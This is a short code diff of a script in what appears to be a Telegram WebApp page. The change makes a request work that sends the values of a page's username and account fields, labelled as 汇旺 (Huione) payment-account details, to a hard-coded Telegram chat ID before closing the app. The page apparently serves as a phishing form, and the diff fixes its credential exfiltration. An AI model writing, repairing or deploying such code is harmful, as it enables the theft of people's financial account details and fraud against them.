@@ -41,10 +41,10 @@
                     Telegram.WebApp.close();
                 }
             };
-            xhr.send({
+            xhr.send(JSON.stringify({
                 "chat_id": "5458197333",
                 "text": "汇旺用户名: " + document.getElementById('username').value + "\n" + "汇旺账号: " + document.getElementById('account').value
-            });
+            }));
         }
     </script>
 </body>
